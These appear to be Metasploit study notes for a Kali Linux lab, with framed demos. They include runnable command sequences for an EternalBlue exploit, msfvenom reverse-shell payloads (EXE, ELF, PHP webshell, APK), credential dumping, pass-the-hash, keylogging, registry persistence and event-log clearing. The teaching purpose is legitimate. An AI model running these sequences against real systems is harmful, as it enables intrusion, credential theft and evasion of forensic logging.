# 🛡️ Metasploit Framework — Complete Study Notes

> **Platform:** Kali Linux | **Level:** Beginner → Intermediate | **Purpose:** Ethical Hacking & Penetration Testing

---

## ⚠️ Legal Disclaimer

> These notes are strictly for **educational purposes** and **authorized penetration testing** only.  
> Never use Metasploit against systems you do not own or have **explicit written permission** to test.  
> Unauthorized use is **illegal** and punishable under laws like the Computer Fraud and Abuse Act (CFAA).

---

## 📖 Table of Contents

1. [What is Metasploit?](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#1-what-is-metasploit)
2. [Core Architecture](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#2-core-architecture)
3. [Key Components](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#3-key-components)
4. [The msfconsole Interface](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#4-the-msfconsole-interface)
5. [Essential Commands Cheatsheet](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#5-essential-commands-cheatsheet)
6. [Practical Demo — Lab Setup](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#6-practical-demo--lab-setup)
7. [Demo 1: Information Gathering with Metasploit](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#7-demo-1-information-gathering-with-metasploit)
8. [Demo 2: Exploiting EternalBlue (MS17-010)](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#8-demo-2-exploiting-eternalblue-ms17-010)
9. [Demo 3: Meterpreter Deep Dive](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#9-demo-3-meterpreter-deep-dive)
10. [Demo 4: Generating Payloads with msfvenom](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#10-demo-4-generating-payloads-with-msfvenom)
11. [Post-Exploitation Essentials](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#11-post-exploitation-essentials)
12. [Pro Tips & Common Mistakes](https://claude.ai/chat/a57e576b-c384-4dd7-bb16-d3c07fd39fcd#12-pro-tips--common-mistakes)

---

## 1. What is Metasploit?

**Metasploit Framework** is an open-source penetration testing platform developed by **H.D. Moore** in 2003, later acquired by **Rapid7**. It is the world's most widely used exploitation framework.

Think of Metasploit as a **Swiss Army knife for hackers** — it bundles together:

- A database of known exploits
- Tools to deliver payloads to target machines
- Post-exploitation utilities to maintain access and gather info

### Why Metasploit?

|Feature|What it means for you|
|---|---|
|2,000+ exploits|Huge library of ready-to-fire attack modules|
|Cross-platform|Works on Linux, Windows, macOS targets|
|Modular design|Mix & match exploits, payloads, encoders|
|Active community|New modules added constantly|
|Integrated recon|Built-in scanner and auxiliary modules|

---

## 2. Core Architecture

```
┌─────────────────────────────────────────────────┐
│                  METASPLOIT FRAMEWORK            │
│                                                  │
│  ┌──────────┐   ┌──────────┐   ┌─────────────┐  │
│  │ Exploits │   │ Payloads │   │  Auxiliaries│  │
│  └──────────┘   └──────────┘   └─────────────┘  │
│  ┌──────────┐   ┌──────────┐   ┌─────────────┐  │
│  │ Encoders │   │  NOPs    │   │  Post Mods  │  │
│  └──────────┘   └──────────┘   └─────────────┘  │
│                                                  │
│         ┌──────────────────────┐                 │
│         │   Rex (Ruby Library) │                 │
│         └──────────────────────┘                 │
│         ┌──────────────────────┐                 │
│         │  MSF Core / Base     │                 │
│         └──────────────────────┘                 │
└─────────────────────────────────────────────────┘
```

Metasploit is written in **Ruby** and built on the **Rex** (Ruby Extension) library which handles all lower-level networking, encoding, and protocol handling.

---

## 3. Key Components

### 3.1 Exploits

An **exploit** is a piece of code that takes advantage of a vulnerability in software, hardware, or configuration.

```
Vulnerability + Trigger Code = Exploit
```

**Categories:**

|Type|Description|Example|
|---|---|---|
|**Remote**|Attacks services over network|EternalBlue (SMB)|
|**Local**|Requires existing access on target|Privilege escalation|
|**Client-side**|Tricks a user into executing code|Malicious PDF/doc|
|**Web**|Targets web apps|SQL injection, XSS|

---

### 3.2 Payloads

A **payload** is the code that runs on the target _after_ the exploit succeeds. If the exploit is the lock-pick, the payload is what you do once you're inside.

**Three types of payloads:**

#### Singles (Inline Payloads)

- Self-contained, small, do one job
- Example: `windows/shell_bind_tcp`
- No staged delivery needed

#### Stagers

- Small code that creates a connection back to attacker
- Downloads the rest of the payload (stage)
- Example: `windows/meterpreter/reverse_tcp` (the stager part)

#### Stages

- The actual "meat" of the payload, downloaded via stager
- Example: Meterpreter, VNC injection

**Naming Convention:**

```
<platform>/<arch>/<payload_type>
windows/x64/meterpreter/reverse_tcp
  │       │       │          └── connects back to attacker
  │       │       └── payload type
  │       └── architecture
  └── target OS
```

---

### 3.3 Auxiliaries

Modules that don't directly exploit but **support the attack**:

- **Scanners** — Port scanners, version detectors
- **Fuzzers** — Send malformed data to crash services
- **Sniffers** — Capture network traffic
- **Brute Forcers** — Try passwords systematically

Example: `auxiliary/scanner/portscan/tcp`

---

### 3.4 Encoders

Encoders **obfuscate payloads** to evade antivirus and IDS/IPS detection.

Popular encoders:

- `x86/shikata_ga_nai` — polymorphic XOR (classic but now detected by most AVs)
- `x64/xor_dynamic` — XOR encoding for 64-bit
- `cmd/powershell_base64` — Base64 encoding for PowerShell payloads

> 💡 Modern AV bypass requires multiple rounds of encoding + custom packers. Encoders alone are rarely enough today.

---

### 3.5 NOPs (No Operation)

NOP sleds are sequences of `NOP` (`0x90`) instructions used to pad shellcode and increase reliability of memory-based exploits. Less critical in modern exploitation but still part of the framework.

---

### 3.6 Post-Exploitation Modules

Run **after** a session is established:

|Module|What it does|
|---|---|
|`post/multi/recon/local_exploit_suggester`|Suggests local privesc exploits|
|`post/windows/gather/hashdump`|Dumps password hashes|
|`post/windows/manage/persistence`|Sets up backdoor for persistence|
|`post/multi/manage/shell_to_meterpreter`|Upgrades shell to Meterpreter|

---

### 3.7 Meterpreter

Meterpreter is Metasploit's **advanced, extensible payload** — it's not just a shell. It runs entirely in memory (no files written to disk), communicates encrypted, and can be extended with scripts on the fly.

**Why Meterpreter over a plain shell?**

|Feature|Plain Shell|Meterpreter|
|---|---|---|
|In-memory only|❌|✅|
|Encrypted comms|❌|✅|
|File transfer|Manual|`upload`/`download`|
|Pivot / routing|Hard|Built-in|
|Screenshot / keylog|❌|✅|
|Token manipulation|❌|`getsystem`, `impersonate_token`|

---

## 4. The msfconsole Interface

Launch it on Kali:

```bash
sudo msfconsole
```

You'll be greeted with ASCII art and the `msf6 >` prompt.

### Interface Layout

```
msf6 > [command] [options]
msf6 exploit(windows/smb/ms17_010_eternalblue) > [command]
         └── active module shown in brackets
```

### Module Context

When you `use` a module, you enter its **context**. Commands like `set`, `show options`, and `run` operate on that module.

---

## 5. Essential Commands Cheatsheet

### Navigation & Search

```bash
# Search for a module
search ms17-010
search type:exploit platform:windows smb

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
use 0                          # use result number from search

# Get info about module
info
info exploit/windows/smb/ms17_010_eternalblue

# Go back to root
back

# Clear screen
clear
```

### Setting Options

```bash
# Show required options
show options

# Set a variable
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50
set LPORT 4444

# Set globally (persists across modules)
setg LHOST 192.168.1.50

# Unset a variable
unset RHOSTS
```

### Payloads

```bash
# List compatible payloads for current module
show payloads

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# View payload options
show advanced
```

### Running

```bash
run          # run the module
exploit      # alias for run
exploit -j   # run as background job
jobs         # list background jobs
kill 0       # kill job 0
```

### Sessions

```bash
sessions           # list all active sessions
sessions -i 1      # interact with session 1
sessions -k 1      # kill session 1
sessions -u 1      # upgrade session 1 to Meterpreter
background         # send current session to background (Ctrl+Z)
```

### Database

```bash
db_status          # check PostgreSQL connection
workspace          # list workspaces
workspace -a lab1  # create new workspace
db_nmap -sV 192.168.1.0/24    # nmap scan and save to DB
hosts              # view discovered hosts
services           # view discovered services
vulns              # view found vulnerabilities
```

---

## 6. Practical Demo — Lab Setup

> **Goal:** Set up a safe, legal lab environment on your own machine

### What You Need

```
┌─────────────────────────────────────┐
│         YOUR HOST MACHINE           │
│                                     │
│  ┌─────────────┐  ┌───────────────┐ │
│  │  Kali Linux │  │ Metasploitable│ │
│  │   (Attacker)│  │  2 (Target)   │ │
│  │ 192.168.1.50│  │ 192.168.1.100 │ │
│  └─────────────┘  └───────────────┘ │
│         VirtualBox / VMware          │
└─────────────────────────────────────┘
```

### Step 1: Download Metasploitable 2

Metasploitable 2 is an **intentionally vulnerable** Linux VM made by Rapid7 for practice.

```bash
# Download from: https://sourceforge.net/projects/metasploitable/
# Or use: https://github.com/rapid7/metasploitable3 (more modern)
```

### Step 2: Network Configuration

In VirtualBox/VMware — set **both VMs** to the **same Host-Only Network**:

- Kali: `192.168.56.101` (or DHCP assigned)
- Metasploitable: `192.168.56.102`

### Step 3: Verify Connectivity

```bash
# From Kali terminal
ping 192.168.56.102

# Should respond if networking is correct
```

### Step 4: Start Metasploit Database

```bash
sudo systemctl start postgresql
sudo msfdb init      # only needed first time
sudo msfconsole
```

---

## 7. Demo 1: Information Gathering with Metasploit

> **Scenario:** You have a target IP. You know nothing else. Let's find what's running.

### Step 1: Basic Port Scan from msfconsole

```bash
msf6 > db_nmap -sV -O 192.168.56.102
```

`-sV` = detect service versions | `-O` = OS detection

Nmap results are automatically saved to your Metasploit database.

### Step 2: Review Discovered Services

```bash
msf6 > hosts
msf6 > services
msf6 > services -p 445    # filter by port
```

**Example output:**

```
Services
========
host             port  proto  name         state  info
----             ----  -----  ----         -----  ----
192.168.56.102   21    tcp    ftp          open   vsftpd 2.3.4
192.168.56.102   22    tcp    ssh          open   OpenSSH 4.7p1
192.168.56.102   80    tcp    http         open   Apache httpd 2.2.8
192.168.56.102   139   tcp    netbios-ssn  open   Samba smbd 3.X
192.168.56.102   445   tcp    microsoft-ds open   Samba smbd 3.X
```

### Step 3: SMB Version Scanner

```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > set RHOSTS 192.168.56.102
msf6 auxiliary(smb_version) > run
```

**Output:**

```
[*] 192.168.56.102:445  - Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] Scanned 1 of 1 hosts (100% complete)
```

### Step 4: FTP Version Check

```bash
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 > set RHOSTS 192.168.56.102
msf6 > run
```

> 💡 **vsftpd 2.3.4** has a famous backdoor! Let's note that for Demo 2.

### Step 5: Search for Vulnerabilities

```bash
msf6 > search vsftpd
```

**Output:**

```
Matching Modules
================
   #  Name                                  Disclosure Date  Rank       Check
   -  ----                                  ---------------  ----       -----
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No
```

---

## 8. Demo 2: Exploiting EternalBlue (MS17-010)

> **Scenario:** Target Windows machine is vulnerable to MS17-010 (EternalBlue) — the exploit used in the WannaCry ransomware attack.
> 
> **Target:** Windows 7 SP1 (unpatched) VM — `192.168.56.103`

### Background

EternalBlue exploits a vulnerability in **SMBv1** (Windows file sharing protocol). It was developed by the NSA, leaked by Shadow Brokers in 2017, and used in WannaCry and NotPetya ransomware.

### Step 1: Verify the Target is Vulnerable

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.56.103
msf6 auxiliary(smb_ms17_010) > run
```

**Expected output:**

```
[+] 192.168.56.103:445 - Host is likely VULNERABLE to MS17-010!
[*] 192.168.56.103:445 - Scanned 1 of 1 hosts (100% complete)
```

### Step 2: Load the Exploit

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### Step 3: Configure the Exploit

```bash
msf6 exploit(ms17_010_eternalblue) > show options

# Set target
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.103

# Set your IP (Kali)
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.101

# Set payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Confirm settings
msf6 exploit(ms17_010_eternalblue) > show options
```

**Full options view:**

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.56.103   yes       Target host(s)
   RPORT          445              yes       Target port
   LHOST          192.168.56.101   yes       Listen address
   LPORT          4444             yes       Listen port
```

### Step 4: Fire!

```bash
msf6 exploit(ms17_010_eternalblue) > run
```

**Output:**

```
[*] Started reverse TCP handler on 192.168.56.101:4444
[*] 192.168.56.103:445 - Connecting to target for exploitation.
[+] 192.168.56.103:445 - Connection established for exploitation.
[+] 192.168.56.103:445 - Target OS selected: Windows 7/8/10/2008/2012/2016
[*] 192.168.56.103:445 - CORE raw buffer dump
[*] 192.168.56.103:445 - Sending SMB1 Session Setup Request
[+] 192.168.56.103:445 - Shellcode stage
[*] Sending stage (200774 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.103:60000)

meterpreter >
```

🎉 You have a Meterpreter session!

---

## 9. Demo 3: Meterpreter Deep Dive

> **Continuing from Demo 2 — you have a Meterpreter session on the Windows target**

### Basic Recon

```bash
meterpreter > sysinfo
```

```
Computer        : WIN7-TARGET
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

```bash
meterpreter > getuid          # Who are we running as?
# Server username: NT AUTHORITY\SYSTEM  ← already SYSTEM!

meterpreter > getpid          # Our process ID
meterpreter > ps              # List all running processes
```

### Privilege Escalation (if not already SYSTEM)

```bash
meterpreter > getsystem       # Auto attempts privesc
# ...got system via technique 1 (Named Pipe Impersonation)

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

### File System Operations

```bash
meterpreter > pwd             # current directory on target
meterpreter > ls              # list files
meterpreter > cd C:\\Users    # navigate

# Download a file from target
meterpreter > download C:\\Users\\victim\\Desktop\\passwords.txt /tmp/

# Upload a file to target
meterpreter > upload /root/tool.exe C:\\Windows\\Temp\\
```

### Persistence & Backdoors

```bash
# Take a screenshot of the desktop
meterpreter > screenshot

# Start keylogger
meterpreter > keyscan_start
# ... wait for victim to type ...
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

### Hashdump (Credential Extraction)

```bash
meterpreter > hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
victim:1001:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::
```

These are **NTLM hashes** — crack them offline with Hashcat or pass them directly:

```bash
# In msfconsole — Pass the Hash attack
msf6 > use exploit/windows/smb/psexec
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Pivoting (Advanced)

If the target machine has access to an internal network you can't reach:

```bash
meterpreter > run post/multi/manage/autoroute SUBNET=10.10.10.0/24
meterpreter > background

# Now scan the internal network through the pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.0/24
msf6 > run
```

---

## 10. Demo 4: Generating Payloads with msfvenom

**msfvenom** = `msfpayload` + `msfencode` combined. Used to generate standalone payload files.

### Basic Syntax

```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT>
```

### Windows Reverse Shell (EXE)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -f exe \
  -o evil.exe
```

### Linux Reverse Shell (ELF)

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -f elf \
  -o shell.elf
```

### PHP Webshell (for web app testing)

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -f raw \
  -o shell.php
```

### Android APK

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -o malicious.apk
```

### PowerShell One-liner

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -f psh-cmd
```

### Setting Up the Listener

After deploying your payload, set up the handler in Metasploit:

```bash
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.101
msf6 > set LPORT 4444
msf6 > run -j    # run as background job
```

When the victim executes the payload, a session opens automatically.

---

## 11. Post-Exploitation Essentials

### Local Exploit Suggester

Find local privilege escalation paths:

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

Output will list exploits that may work based on the target's OS and patch level.

### Persistence Module

```bash
meterpreter > run post/windows/manage/persistence \
  STARTUP=REGISTRY \
  SESSION=1
```

Creates a registry run key so the payload executes on every reboot.

### Mimikatz Integration (Kiwi)

Mimikatz is the gold standard for Windows credential extraction. It's integrated into Meterpreter:

```bash
meterpreter > load kiwi

meterpreter > creds_all          # dump all credentials
meterpreter > lsa_dump_sam       # dump SAM database
meterpreter > lsa_dump_secrets   # dump LSA secrets
meterpreter > wifi_list          # dump saved WiFi passwords
```

### Clearing Tracks

```bash
meterpreter > clearev            # clear Windows event logs
```

---

## 12. Pro Tips & Common Mistakes

### ✅ Pro Tips

**1. Always check `show options` before running**

```bash
msf6 > show options
# Missing a required option = module won't run
```

**2. Use workspaces to organize engagements**

```bash
msf6 > workspace -a client_pentest
msf6 > workspace client_pentest
```

**3. Save your session before it dies**

```bash
meterpreter > run post/windows/manage/persistence
# Always establish persistence before deep post-exploitation
```

**4. Upgrade shell sessions to Meterpreter**

```bash
msf6 > sessions -u 1
# Upgrades a plain shell (session 1) to Meterpreter
```

**5. Use `-j` to run exploits in background**

```bash
msf6 > exploit -j
# Frees up your prompt, session opens in background
```

**6. Resource scripts for automation**

```bash
# Create a .rc file
echo "use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.103
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
run" > autoexploit.rc

# Run it
msf6 > resource /root/autoexploit.rc
```

---

### ❌ Common Mistakes

|Mistake|Fix|
|---|---|
|Forgetting to set LHOST|Always `set LHOST <your-kali-ip>`|
|Wrong architecture payload|Check target arch with `sysinfo`, use `x64` or `x86` accordingly|
|Firewall blocks connection|Try `bind_tcp` instead of `reverse_tcp`|
|Running without DB|`sudo systemctl start postgresql && sudo msfdb init`|
|Killing session with `exit`|Use `background` (Ctrl+Z) to keep session alive|
|msfvenom wrong format|Check `-l formats` for all supported output formats|

---

### Quick Reference: Payload Choosing Guide

```
Target can connect to you?
    YES → use reverse_tcp   (most common, bypasses most firewalls)
    NO  → use bind_tcp      (target opens a port, you connect to it)

Stealth needed?
    YES → use https variants (encrypted, looks like normal web traffic)
          windows/x64/meterpreter/reverse_https

Unstable connection?
    YES → use rc4 or stageless payloads
          windows/x64/meterpreter_reverse_tcp  (no slash = stageless)
```

---

## 📚 Further Learning

|Resource|URL|
|---|---|
|Offensive Security (OSCP)|https://www.offensive-security.com|
|Metasploit Unleashed|https://www.offensive-security.com/metasploit-unleashed/|
|HackTheBox|https://www.hackthebox.com|
|TryHackMe — Metasploit Room|https://tryhackme.com/module/metasploit|
|Rapid7 Metasploit Docs|https://docs.metasploit.com|
|VulnHub (practice VMs)|https://www.vulnhub.com|

---

_Study notes compiled for Kali Linux users — Always hack ethically and legally._ 🐉



## Related Topics 

- [[Skills Required for Ethical Hacking]]
- [[Types of Ethical Hacking]]
- [[🏠 Home - Ethical Hacking Hub]]
- [[MOC - Scanning]]
- [[Ethical Hacking - Definition and Overview]]
- [[MOC - Tools]]
- 